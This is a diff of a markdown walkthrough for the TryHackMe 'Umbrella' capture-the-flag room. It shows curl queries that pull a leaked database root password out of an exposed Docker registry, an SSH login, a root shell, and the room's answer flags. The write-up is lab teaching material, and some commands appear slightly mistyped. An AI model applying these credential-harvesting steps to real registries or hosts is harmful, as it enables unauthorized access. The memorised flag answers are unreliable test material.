@@ -199,6 +199,9 @@ curl -s http://umbrella.thm:5000/v2/umbrella/timetracking/tags/list | jq
 -  container : 527e55a70a337461e3615c779b0ad035e0860201e4745821c5f3bc4dcd7e6ef9
 -  \",\"container_config\":{\"Hostname\":\"527e55a70a33\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":false,\"AttachStdout\":false,\"AttachStderr\":false,\"ExposedPorts\":{\"8080/tcp\":{}},\"Tty\":false,\"OpenStdin\":false,\"StdinOnce\":false,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\"NODE_VERSION=19.3.0\",\"YARN_VERSION=1.22.19\",\"DB_HOST=db\",\"DB_USER=root\",\"DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5\",\"DB_DATABASE=timetracking\",\"LOG_FILE=/logs/tt.log\"],\"Cmd\":[\"/bin/sh\",\"-c\",\"#(nop) \",\"CMD [\\\"node\\\" \\\"app.js\\\"]\"],\"Image\":\"sha256:039f3deb094d2931ed42571037e473a5e2daa6fd1192aa1be80298ed61b110f1\",\"Volumes\":null,\"WorkingDir\":\"/usr/src/app\",\"Entrypoint\":[\"docker-entrypoint.sh\"],\"OnBuild\":null,\"Labels\":{}},\"created\":\"2022-</p>
 
+<br>
+
+
 ```bash
 url -s http://umbrella.thm:5000/v2/umbrella/timetracking/manifests/latest | jq
 {
@@ -367,10 +370,10 @@ url -s http://umbrella.thm:5000/v2/umbrella/timetracking/manifests/latest | jq
 }
 ```
 
-<h3 align="left">Answer the question below</h3>
+<br>
 
-> 1.1. <em>What is the DB password?</em><br><a id='1.1'></a>
->> <strong><code>Ng1-f3!Pe7-e5?Nf3xe5a</code></strong><br>
+> 1.2. <em>What is the user flag?</em><br><a id='1.2'></a>
+>> <strong><code>THM{d832c0e4cf71312708686124f7a6b25e}</code></strong><br>
 
 
 ```bash
@@ -463,6 +466,8 @@ ssh claire-r@TargetIP
 claire-r@ip-xx-xx-xxx-xxx:~$ cat user.txt
 THM{d832c0e4cf71312708686124f7a6b25e}
 ```
+
+<br>
 
 ```bash
 claire-r@ip-xx-xx-xxx-xxx:~$ cd timeTracker-src
@@ -668,6 +673,12 @@ uid=0(root) gid=0(root) groups=0(root)
 pwd
 /usr/src/app
 ```
+
+<br>
+
+> 1.3. <em>What is the root flag?</em><br><a id='1.3'></a>
+>> <strong><code>THM{1e15fbe7978061c6bb1924124fd9eab2}</code></strong><br>
+
 
 <br>
 
